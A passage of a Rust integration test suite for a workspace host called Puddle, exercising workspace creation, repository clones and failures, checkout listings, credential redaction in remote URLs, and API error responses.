    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let name = WorkspaceName::new("hosts").unwrap();
    let not_running = |result: Result<_, puddle_host::EndExtensionHostsError>| {
        assert!(
            matches!(result, Err(puddle_host::EndExtensionHostsError::NotRunning)),
            "{result:?}"
        );
    };
    // Unknown, then known but without a connected agent (the fake guest runs none): nothing to
    // reach, and no hang.
    not_running(host.workspaces().end_extension_hosts(&name).await);
    create(&api, &mut events, "hosts").await;
    not_running(host.workspaces().end_extension_hosts(&name).await);
    api.post("/api/workspaces/hosts/stop", "").await;
    events.until(ended("hosts"), Duration::from_secs(20)).await;
    not_running(host.workspaces().end_extension_hosts(&name).await);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn switching_an_editor_build_needs_no_connected_window_and_a_running_agent() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let name = WorkspaceName::new("builds").unwrap();
    // A window on the server: refused before anything is asked of the guest, even for a
    // workspace that does not exist.
    let refused = host.workspaces().switch_editor_build(&name, 2).await;
    assert!(
        matches!(
            refused,
            Err(puddle_host::SwitchEditorBuildError::WindowsConnected(2))
        ),
        "{refused:?}"
    );
    // No window, but no agent either (unknown, then known with a fake guest that runs none).
    let not_running = |result: Result<bool, puddle_host::SwitchEditorBuildError>| {
        assert!(
            matches!(result, Err(puddle_host::SwitchEditorBuildError::NotRunning)),
            "{result:?}"
        );
    };
    not_running(host.workspaces().switch_editor_build(&name, 0).await);
    create(&api, &mut events, "builds").await;
    not_running(host.workspaces().switch_editor_build(&name, 0).await);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_api_and_the_pull_proxy_are_each_registered_once_in_the_one_registry() {
    let rig = Rig::new();
    let host = rig.start().await;
    let kinds: Vec<_> = host
        .endpoints()
        .list()
        .into_iter()
        .map(|(_, kind)| kind)
        .collect();
    assert_eq!(
        kinds.iter().filter(|k| **k == EndpointKind::Api).count(),
        1,
        "{kinds:?}"
    );
    assert_eq!(
        kinds
            .iter()
            .filter(|k| **k == EndpointKind::PullProxy)
            .count(),
        1,
        "{kinds:?}"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_network_health_report_is_the_hosts_own_and_follows_a_network_change() {
    let rig = Rig::new();
    let os = FakeOs::new(ProxyConfig::default());
    let mut platform = FakePlatform::new(&rig.log);
    platform.roots = company_roots();
    let prepared = prepare(rig.config(), &platform).unwrap();
    let mut options = hermetic_options();
    options.discovery = Some(Discovery::new(
        os.clone(),
        puddle_upstream::Config::default(),
    ));
    let host = Host::start(prepared, &FakeFactory::new(&rig.runtime, &rig.log), options)
        .await
        .unwrap();
    let api = api(&host);

    assert_eq!(
        api.request("GET", "/api/network-health", None, false)
            .await
            .status,
        401
    );
    let reply = api.get("/api/network-health").await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    let report = reply.json();
    assert_eq!(report["roots"]["synced"], true, "{report}");
    assert_eq!(report["roots"]["roots"], 1, "{report}");
    assert_eq!(
        report["roots"]["certificates"][0]["subject"],
        "Corp Root CA"
    );
    assert_eq!(
        report["pull_proxy"],
        json!({"active": true, "via_upstream": true})
    );
    assert_eq!(report["proxy"]["epoch"], 0);
    assert_eq!(report["proxy"]["last_change_at"], serde_json::Value::Null);

    // A network change: the event, then a report that shows the new epoch.
    let mut events = api.events().await;
    assert!(os.fire_change());
    let event = events
        .until(|e| e["type"] == "network_changed", Duration::from_secs(20))
        .await;
    assert_eq!(event["epoch"], 1, "{event}");
    let after = api.get("/api/network-health").await.json();
    assert_eq!(after["proxy"]["epoch"], 1, "{after}");
    assert!(after["proxy"]["last_change_at"].as_u64().unwrap() > 0);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_repository_lists_run_on_the_real_engine_and_a_host_it_does_not_know_is_asked_nothing()
{
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);

    // Wired: no identities is an empty answer, not a 503.
    let none = api.get("/api/repos").await;
    assert_eq!(none.status, 200, "{}", none.body);
    assert_eq!(
        none.json(),
        json!({"sources": [], "repos": [], "total": 0, "offset": 0, "limit": 100})
    );

    // A credential for a host that is neither GitHub nor Azure DevOps: the engine says so and
    // sends nothing (no token is read, no connection is made).
    let made = api
        .post(
            "/api/identities",
            &json!({
                "label": "Other",
                "author": {"name": "Other", "email": "other@example.org"},
                "credentials": [{
                    "host": "git.example.org",
                    "source": {"kind": "stored", "id": "tok-1", "host": "git.example.org", "org": null},
                    "covers": {"owners": [], "rest_of_host": true}
                }]
            })
            .to_string(),
        )
        .await;
    assert_eq!(made.status, 201, "{}", made.body);
    let listing = api.get("/api/repos").await.json();
    assert_eq!(listing["sources"][0]["state"], "unavailable", "{listing}");
    assert_eq!(listing["sources"][0]["problem"]["code"], "unsupported");
    assert_eq!(listing["total"], 0);

    let profile = api
        .post(
            "/api/credentials/profile",
            &json!({"source": {"kind": "stored", "id": "tok-1", "host": "git.example.org", "org": null}})
                .to_string(),
        )
        .await;
    assert_eq!(profile.status, 200, "{}", profile.body);
    assert_eq!(profile.json()["problem"]["code"], "unsupported");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_system_check_looks_at_the_runtime_folder_the_host_was_started_with() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);

    assert_eq!(
        api.request("GET", "/api/doctor?boot=false", None, false)
            .await
            .status,
        401
    );
    // The rig's runtime folder holds no msb: the check says so, names the folder, and skips what
    // needs a runtime. (The machine's own hypervisor check can come out either way.)
    let reply = api.get("/api/doctor?boot=false").await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    let report = reply.json();
    assert_eq!(report["schema_version"], 1, "{report}");
    assert_eq!(report["ok"], false, "{report}");
    let check = |id: &str| {
        report["checks"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["id"] == id)
            .unwrap_or_else(|| panic!("no {id} check in {report}"))
            .clone()
    };
    let runtime = check("runtime");
    assert_eq!(runtime["status"], "fail", "{runtime}");
    assert_eq!(runtime["finding"], "runtime_missing", "{runtime}");
    assert!(
        runtime["summary"]
            .as_str()
            .unwrap()
            .contains(&rig.dir.path().join("runtime").display().to_string()),
        "{runtime}"
    );
    assert_eq!(check("launch")["status"], "skipped");
    assert_eq!(check("test_boot")["status"], "skipped");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_sync_after_the_clones_leaves_nothing_behind() {
    let rig = Rig::new();
    rig.guest.fail_sync.store(true, Ordering::SeqCst);
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed");
    assert!(
        end["detail"].as_str().unwrap().contains("sync: I/O error"),
        "{end}"
    );
    assert_eq!(
        events.steps("acme"),
        [
            "preparing_volume",
            "pulling_image",
            "starting",
            "syncing",
            "cloning",
            "failed"
        ]
    );
    // No record, no sandbox, no volume, no VM.
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert!(rig.runtime.list().await.unwrap().is_empty());
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    // The name is free again.
    rig.guest.fail_sync.store(false, Ordering::SeqCst);
    create(&api, &mut events, "acme").await;
    host.shutdown().await;
}

/// The only problem standing is the failed clone of `url` into `workspace`'s `dir`, with git's
/// error first and the way out last.
async fn the_one_problem_names_the_clone(api: &Api, workspace: &str, dir: &str, url: &str) {
    let problems = problems_of(api).await;
    assert_eq!(problems.len(), 1, "{problems:?}");
    let (key, about, title, detail) = &problems[0];
    assert_eq!(key, &format!("clone:{workspace}:{dir}"));
    assert_eq!(about.as_deref(), Some(workspace));
    assert_eq!(
        title,
        &format!("Puddle could not clone {url} into {workspace}")
    );
    assert!(
        detail.starts_with(&format!(
            "git exited 128: fatal: unable to access '{url}': Could not resolve host"
        )),
        "{detail}"
    );
    assert!(
        detail.ends_with(&format!("git clone {url} /workspaces/{workspace}/{dir}")),
        "{detail}"
    );
}

/// Records, at each clone of `workspace`, the identities and repository table rows it has by then.
fn git_settings_at_each_clone(
    rig: &Rig,
    host: &Host<FakeRuntime>,
    workspace: &str,
) -> Arc<Mutex<Vec<String>>> {
    let store = host.store().clone();
    let workspace = WorkspaceName::new(workspace).unwrap();
    let seen: Arc<Mutex<Vec<String>>> = Arc::default();
    let look = seen.clone();
    *rig.guest.at_clone.lock().unwrap() = Some(Box::new(move |url: &str| {
        let git = store.workspace_git(&workspace).unwrap();
        let rows: Vec<String> = git.repos.iter().map(|r| r.repo.to_string()).collect();
        let identities: Vec<String> = git.identities.iter().map(|i| i.label.clone()).collect();
        look.lock().unwrap().push(format!(
            "clone {url}: identities {identities:?}, rows {rows:?}"
        ));
    }));
    seen
}

/// An identity "Work" that covers `example.org/acme`.
async fn make_work_identity(api: &Api) {
    let work = api
        .post(
            "/api/identities",
            &json!({
                "label": "Work",
                "author": {"name": "Work", "email": "work@example.org"},
                "credentials": [{
                    "host": "example.org",
                    "source": {"kind": "gh", "host": "example.org", "account": "me"},
                    "covers": {"owners": ["acme"], "rest_of_host": false}
                }]
            })
            .to_string(),
        )
        .await;
    assert_eq!(work.status, 201, "{}", work.body);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_clone_that_fails_fails_only_its_repository_and_every_clone_carries_its_git_settings() {
    const DOWN: &str = "https://unreachable.example/acme/docs.git";
    let rig = Rig::new();
    *rig.guest.fail_clone_of.lock().unwrap() = Some(DOWN.to_owned());
    let host = rig.start().await;
    let seen = git_settings_at_each_clone(&rig, &host, "trio");
    let api = api(&host);
    make_work_identity(&api).await;
    let mut events = api.events().await;
    let reply = api
        .post(
            "/api/workspaces",
            &json!({"name": "trio", "repositories": [
                {"url": REPO},
                {"url": DOWN},
                {"url": "https://example.org/acme/web", "push": false}
            ]})
            .to_string(),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("trio"), Duration::from_secs(20)).await;
    assert_eq!(
        end["step"], "done",
        "a failed clone does not fail the create: {end}"
    );
    assert_eq!(
        events.steps("trio"),
        [
            "preparing_volume",
            "pulling_image",
            "starting",
            "syncing",
            "cloning",
            "cloning",
            "cloning",
            "done"
        ]
    );
    // The identity and every table row were in place before the first clone ran.
    let all_rows =
        r#"["example.org/acme/api", "unreachable.example/acme/docs", "example.org/acme/web"]"#;
    assert_eq!(
        *seen.lock().unwrap(),
        [
            format!(r#"clone {REPO}: identities ["Work"], rows {all_rows}"#),
            format!(r#"clone {DOWN}: identities ["Work"], rows {all_rows}"#),
            format!(r#"clone https://example.org/acme/web: identities ["Work"], rows {all_rows}"#),
        ]
    );
    assert_eq!(
        rig.guest.clone_commands(),
        [
            format!("clone -- {REPO} /workspaces/trio/api"),
            format!("clone -- {DOWN} /workspaces/trio/docs"),
            "clone -- https://example.org/acme/web /workspaces/trio/web".to_owned(),
        ]
    );
    assert_eq!(rig.guest.syncs(), 1, "one sync after the last clone");
    // The workspace runs, keeps all three entries, and a problem names what was not cloned.
    let ws = api.get("/api/workspaces/trio").await.json();
    assert_eq!(ws["status"], "running");
    assert_eq!(
        ws["repositories"],
        json!([
            {"url": REPO, "directory": "api"},
            {"url": DOWN, "directory": "docs"},
            {"url": "https://example.org/acme/web", "directory": "web"}
        ])
    );
    the_one_problem_names_the_clone(&api, "trio", "docs", DOWN).await;
    let git = api.get("/api/workspaces/trio/git").await.json();
    let toggles: Vec<_> = git["repos"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| (r["repo"].clone(), r["push"].clone()))
        .collect();
    assert_eq!(
        toggles,
        [
            (json!("api"), json!(true)),
            (json!("docs"), json!(true)),
            (json!("web"), json!(false))
        ]
    );
    stop_and_delete(&api, &mut events, "trio").await;
    assert_eq!(
        problems_of(&api).await,
        [],
        "deleting the workspace ends its problem"
    );
    host.shutdown().await;
}

async fn stop_and_delete(api: &Api, events: &mut support::Events, name: &'static str) {
    api.post(&format!("/api/workspaces/{name}/stop"), "").await;
    events.until(ended(name), Duration::from_secs(20)).await;
    let deleted = api
        .delete(
            &format!("/api/workspaces/{name}"),
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(deleted.status, 202, "{}", deleted.body);
    events.until(ended(name), Duration::from_secs(20)).await;
}

const WEB: &str = "https://example.org/acme/web";

/// Adds `body` to workspace `name`'s list and waits for the clone it starts to end.
async fn add_and_wait(
    api: &Api,
    events: &mut support::Events,
    name: &'static str,
    body: serde_json::Value,
) -> support::Reply {
    let reply = api
        .post(
            &format!("/api/workspaces/{name}/repositories"),
            &body.to_string(),
        )
        .await;
    if reply.status == 202 {
        events.until(ended(name), Duration::from_secs(20)).await;
    }
    reply
}

async fn checkouts_of(api: &Api, name: &str) -> serde_json::Value {
    let reply = api.get(&format!("/api/workspaces/{name}/checkouts")).await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    reply.json()
}

#[tokio::test(flavor = "multi_thread")]
async fn an_added_clone_has_its_identity_and_table_row_before_it_runs_and_is_listed_after() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    make_work_identity(&api).await;
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    let seen = git_settings_at_each_clone(&rig, &host, "adds");

    let reply = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "clone", "url": WEB}),
    )
    .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    assert_eq!(reply.json()["busy"], "cloning");
    assert_eq!(
        *seen.lock().unwrap(),
        [format!(
            r#"clone {WEB}: identities ["Work"], rows ["example.org/acme/api", "example.org/acme/web"]"#
        )]
    );
    assert_eq!(
        rig.guest.clone_commands().last().unwrap(),
        &format!("clone -- {WEB} /workspaces/adds/web")
    );
    assert_eq!(
        rig.guest.syncs(),
        2,
        "one sync after each of the two clones"
    );
    let ws = api.get("/api/workspaces/adds").await.json();
    assert_eq!(ws["busy"], serde_json::Value::Null, "{ws}");
    assert_eq!(ws["repositories"].as_array().unwrap().len(), 2, "{ws}");

    // The listing reads the volume after the clone and ties each checkout to its entry.
    let list = checkouts_of(&api, "adds").await;
    assert_eq!(list["running"], true);
    let dirs: Vec<_> = list["checkouts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| (c["directory"].as_str().unwrap(), c["entry"]["url"].as_str()))
        .collect();
    assert_eq!(dirs, [("api", Some(REPO)), ("web", Some(WEB))]);
    assert_eq!(list["missing"], json!([]));

    // A taken directory is refused and a listed address cannot be added twice.
    let again = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "clone", "url": WEB}),
    )
    .await;
    assert_eq!(again.status, 409, "{}", again.body);
    let taken = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "clone", "url": "https://example.org/other/web", "directory": "web"}),
    )
    .await;
    assert_eq!(taken.status, 409, "{}", taken.body);
    assert_eq!(
        rig.guest.clone_commands().len(),
        2,
        "no clone ran for either"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_added_clone_keeps_its_entry_and_one_problem_and_cloning_again_clears_it() {
    const DOWN: &str = "https://unreachable.example/acme/docs.git";
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    *rig.guest.fail_clone_of.lock().unwrap() = Some(DOWN.to_owned());

    let reply = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "clone", "url": DOWN}),
    )
    .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let ws = api.get("/api/workspaces/adds").await.json();
    assert_eq!(ws["repositories"].as_array().unwrap().len(), 2, "{ws}");
    the_one_problem_names_the_clone(&api, "adds", "docs", DOWN).await;
    // The entry shows as not on the disk.
    assert_eq!(checkouts_of(&api, "adds").await["missing"], json!(["docs"]));

    // Cloning again while the directory is empty works and the problem goes.
    *rig.guest.fail_clone_of.lock().unwrap() = None;
    let reply = api
        .post("/api/workspaces/adds/repositories/docs/clone", "")
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended("adds"), Duration::from_secs(20)).await;
    assert!(problems_of(&api).await.is_empty());
    assert_eq!(checkouts_of(&api, "adds").await["missing"], json!([]));
    // An entry that is on the disk is not cloned over.
    let reply = api
        .post("/api/workspaces/adds/repositories/docs/clone", "")
        .await;
    assert_eq!(reply.status, 409, "{}", reply.body);
    let reply = api
        .post("/api/workspaces/adds/repositories/nope/clone", "")
        .await;
    assert_eq!(reply.status, 404, "{}", reply.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn managing_a_checkout_reads_its_remote_again_and_changes_nothing_in_it() {
    const MOVED: &str = "https://example.org/acme/moved.git";
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    make_work_identity(&api).await;
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    rig.guest
        .put_checkout("legacy", "https://example.org/acme/legacy.git");
    rig.guest
        .put_checkout("ssh", "git@example.org:acme/ssh.git");
    let clones = rig.guest.clone_commands().len();
    let commands = rig.guest.commands().len();

    // The listing offers it; then its remote changes before the call.
    // A listing made at the same millisecond as the call would be shared with it.
    tokio::time::sleep(Duration::from_millis(20)).await;
    let list = checkouts_of(&api, "adds").await;
    let legacy = list["checkouts"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["directory"] == "legacy")
        .unwrap()
        .clone();
    assert_eq!(legacy["entry"], serde_json::Value::Null);
    assert_eq!(legacy["manage"]["offered"], true);
    rig.guest.put_checkout("legacy", MOVED);

    // The user saw the old address: a swapped remote is refused, naming both, and adds nothing.
    let swapped = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "existing", "url": "https://example.org/acme/legacy.git", "directory": "legacy"}),
    )
    .await;
    assert_eq!(swapped.status, 409, "{}", swapped.body);
    assert!(
        swapped.body.contains("legacy.git") && swapped.body.contains(MOVED),
        "{}",
        swapped.body
    );
    let record = api.get("/api/workspaces/adds").await.json();
    assert_eq!(
        record["repositories"].as_array().unwrap().len(),
        1,
        "{record}"
    );
    let listings = rig.guest.listings.lock().unwrap().len();

    let reply = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "existing", "url": MOVED, "directory": "legacy"}),
    )
    .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    assert_eq!(
        rig.guest
            .listings
            .lock()
            .unwrap()
            .last()
            .unwrap()
            .as_deref(),
        Some("legacy"),
        "its remote was read again for this call"
    );
    assert_eq!(rig.guest.listings.lock().unwrap().len(), listings + 1);
    let entries = reply.json()["repositories"].clone();
    assert_eq!(entries[1], json!({"url": MOVED, "directory": "legacy"}));
    assert_eq!(
        rig.guest.clone_commands().len(),
        clones,
        "nothing was cloned"
    );
    assert_eq!(
        rig.guest.commands().len(),
        commands,
        "no command but the reads ran in the guest"
    );
    let git = api.get("/api/workspaces/adds/git").await.json();
    let rows: Vec<_> = git["repos"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["repo"].as_str().unwrap().to_owned())
        .collect();
    assert_eq!(
        rows,
        ["api", "moved"],
        "the new row is the one read just now"
    );

    // One that is not a checkout, one with an SSH remote and one already listed are refused.
    for dir in ["missing", "ssh", "legacy"] {
        let refused = add_and_wait(
            &api,
            &mut events,
            "adds",
            json!({"kind": "existing", "url": "https://example.org/acme/x.git", "directory": dir}),
        )
        .await;
        assert_eq!(refused.status, 409, "{dir}: {}", refused.body);
    }
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn removing_an_entry_keeps_the_checkout_its_table_row_and_its_identity() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    make_work_identity(&api).await;
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    let rows_before = api.get("/api/workspaces/adds/git").await.json();

    let reply = api
        .delete("/api/workspaces/adds/repositories/api", None)
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    assert_eq!(reply.json()["repositories"], json!([]));
    let list = checkouts_of(&api, "adds").await;
    let checkout = &list["checkouts"][0];
    assert_eq!(checkout["directory"], "api");
    assert_eq!(
        checkout["entry"],
        serde_json::Value::Null,
        "the checkout stays, off the list"
    );
    assert_eq!(
        api.get("/api/workspaces/adds/git").await.json(),
        rows_before
    );
    let gone = api
        .delete("/api/workspaces/adds/repositories/api", None)
        .await;
    assert_eq!(gone.status, 404, "{}", gone.body);

    // The checkout can be managed again.
    let back = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "existing", "url": "https://example.org/acme/api.git", "directory": "api"}),
    )
    .await;
    assert_eq!(back.status, 200, "{}", back.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_that_is_cloning_cannot_be_stopped_or_asked_for_a_second_clone() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    let (release, hold) = std::sync::mpsc::channel::<()>();
    let hold = Mutex::new(hold);
    *rig.guest.at_clone.lock().unwrap() = Some(Box::new(move |_| {
        wait_for(&hold.lock().unwrap());
    }));

    let reply = api
        .post(
            "/api/workspaces/adds/repositories",
            &json!({"kind": "clone", "url": WEB}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let stop = api.post("/api/workspaces/adds/stop", "").await;
    assert_eq!(stop.status, 409, "{}", stop.body);
    let clone_too = api
        .post(
            "/api/workspaces/adds/repositories",
            &json!({"kind": "clone", "url": "https://example.org/acme/more"}).to_string(),
        )
        .await;
    assert_eq!(clone_too.status, 409, "{}", clone_too.body);
    assert!(
        clone_too.body.contains("busy (cloning)"),
        "{}",
        clone_too.body
    );
    rig.guest
        .put_checkout("legacy", "https://example.org/acme/legacy.git");
    let second = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "existing", "url": "https://example.org/acme/legacy.git", "directory": "legacy"}),
    )
    .await;
    assert_eq!(second.status, 409, "{}", second.body);
    let delete = api
        .delete(
            "/api/workspaces/adds",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(delete.status, 409, "{}", delete.body);

    release.send(()).unwrap();
    events.until(ended("adds"), Duration::from_secs(20)).await;
    assert_eq!(
        rig.guest.clone_commands().len(),
        2,
        "only the first add cloned"
    );
    let stop = api.post("/api/workspaces/adds/stop", "").await;
    assert_eq!(stop.status, 202, "{}", stop.body);
    events.until(ended("adds"), Duration::from_secs(20)).await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stopped_workspace_lists_the_checkouts_it_had_and_refuses_an_add() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    // The listing after the start is made in the background: wait for it.
    for _ in 0..500 {
        if !rig.guest.listings.lock().unwrap().is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    api.post("/api/workspaces/adds/stop", "").await;
    events.until(ended("adds"), Duration::from_secs(20)).await;
    let listings = rig.guest.listings.lock().unwrap().len();

    let list = checkouts_of(&api, "adds").await;
    assert_eq!(list["running"], false);
    assert!(
        list["problem"].as_str().unwrap().contains("not running"),
        "{list}"
    );
    assert_eq!(
        list["checkouts"][0]["directory"], "api",
        "the last listing is kept: {list}"
    );
    assert_eq!(
        rig.guest.listings.lock().unwrap().len(),
        listings,
        "no command ran"
    );

    let add = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "clone", "url": WEB}),
    )
    .await;
    assert_eq!(add.status, 409, "{}", add.body);
    // Taking an entry off the list works while stopped.
    let removed = api
        .delete("/api/workspaces/adds/repositories/api", None)
        .await;
    assert_eq!(removed.status, 200, "{}", removed.body);
    host.shutdown().await;
}

/// Holds the calling guest command until the test sends or 20 seconds pass, without keeping the
/// runtime's thread from running the rest of the test.
// flake-ok: a fake guest command that blocks until the test releases it, not a test waiting for a
// condition (nothing is polled); the 20 s cap is below nextest's kill, so a test that never sends fails
// here instead of hanging.
fn wait_for(hold: &std::sync::mpsc::Receiver<()>) {
    tokio::task::block_in_place(|| {
        let _ = hold.recv_timeout(Duration::from_secs(20));
    });
}

/// Waits until the background listing after a start has run. It is the boot's last background
/// command, and the fake counts a command before it answers, so a fault armed after this returns
/// can only meet the test's own commands.
async fn after_boot_listing(rig: &Rig) {
    eventually("a listing after the boot", APPLY, || {
        !rig.guest.listings.lock().unwrap().is_empty()
    })
    .await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_listing_says_why_a_remote_is_not_shown_and_a_checkout_it_cannot_read_cannot_be_managed()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    after_boot_listing(&rig).await;
    rig.guest
        .put_checkout("keyed", "https://me:secret@example.org/acme/keyed.git");
    rig.guest
        .put_checkout("plain", "http://example.org/acme/plain.git");
    rig.guest.put_checkout("bare", "");
    rig.guest
        .put_checkout("shell", "git@example.org:acme/shell.git");
    rig.guest
        .unreadable
        .lock()
        .unwrap()
        .push(("broken".to_owned(), "permission denied".to_owned()));
    // The host's clock counts milliseconds and a listing begun in the call's own millisecond counts
    // as fresh: the call has to start after the guest changed.
    tokio::time::sleep(Duration::from_millis(20)).await;

    let list = checkouts_of(&api, "adds").await;
    let notes: Vec<_> = list["checkouts"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| (c["directory"].as_str().unwrap(), c["remote_note"].clone()))
        .collect();
    assert_eq!(
        notes,
        [
            ("api", json!(null)),
            ("bare", json!("no_remote")),
            ("broken", json!(null)),
            ("keyed", json!("credentials_removed")),
            ("plain", json!("not_https")),
            ("shell", json!("ssh")),
        ]
    );
    let keyed = &list["checkouts"][3];
    assert_eq!(keyed["remote_url"], "https://example.org/acme/keyed.git");
    assert!(!list.to_string().contains("secret"), "{list}");
    assert_eq!(list["checkouts"][2]["unreadable"], "permission denied");

    let refused = add_and_wait(
        &api,
        &mut events,
        "adds",
        json!({"kind": "existing", "url": "https://example.org/acme/broken.git", "directory": "broken"}),
    )
    .await;
    assert_eq!(refused.status, 409, "{}", refused.body);
    assert!(
        refused.body.contains("permission denied"),
        "{}",
        refused.body
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_listing_the_guest_cannot_make_is_a_problem_in_the_answer_not_an_error() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    after_boot_listing(&rig).await;
    rig.guest.fail_listing.store(true, Ordering::SeqCst);
    // The host's clock counts milliseconds and a listing begun in the call's own millisecond counts
    // as fresh: the call has to start after the guest changed.
    tokio::time::sleep(Duration::from_millis(20)).await;

    let list = checkouts_of(&api, "adds").await;
    assert_eq!(list["running"], true);
    assert!(
        list["problem"].as_str().unwrap().contains("cannot enter"),
        "{list}"
    );
    assert_eq!(list["checked_at"], json!(null));
    assert_eq!(list["checkouts"], json!([]));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn calls_that_wait_for_a_listing_share_the_one_that_starts_after_they_asked() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api0 = api(&host);
    let mut events = api0.events().await;
    create(&api0, &mut events, "adds").await;
    after_boot_listing(&rig).await;
    tokio::time::sleep(Duration::from_millis(20)).await;
    let before = rig.guest.listings.lock().unwrap().len();
    let (release, hold) = std::sync::mpsc::channel::<()>();
    *rig.guest.listing_hold.lock().unwrap() = Some(hold);

    let ask = |host: &Host<FakeRuntime>| {
        let api = api(host);
        tokio::spawn(async move { checkouts_of(&api, "adds").await })
    };
    let first = ask(&host);
    while !rig.guest.listing_waits.load(Ordering::SeqCst) {
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    tokio::time::sleep(Duration::from_millis(20)).await;
    let (second, third) = (ask(&host), ask(&host));
    tokio::time::sleep(Duration::from_millis(200)).await;
    release.send(()).unwrap();
    let (first, second, third) = (
        first.await.unwrap(),
        second.await.unwrap(),
        third.await.unwrap(),
    );
    assert_eq!(
        rig.guest.listings.lock().unwrap().len(),
        before + 2,
        "the held listing, and one for the two that waited behind it"
    );
    assert_eq!(second, third);
    assert!(second["checked_at"].as_u64() >= first["checked_at"].as_u64());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_list_that_cannot_be_saved_changes_nothing_and_says_so() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    make_unwritable(&list_path(&rig));

    let reply = api
        .delete("/api/workspaces/adds/repositories/api", None)
        .await;
    assert_eq!(reply.status, 503, "{}", reply.body);
    assert!(reply.body.contains("nothing changed"), "{}", reply.body);
    let ws = api.get("/api/workspaces/adds").await.json();
    assert_eq!(ws["repositories"].as_array().unwrap().len(), 1, "{ws}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn nothing_is_added_once_shutdown_has_begun() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    host.workspaces().close();
    let reply = api
        .post(
            "/api/workspaces/adds/repositories",
            &json!({"kind": "clone", "url": WEB}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 503, "{}", reply.body);
    assert!(reply.body.contains("shutting down"), "{}", reply.body);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn an_entry_cannot_be_removed_while_its_workspace_is_being_created() {
    let rig = Rig::new();
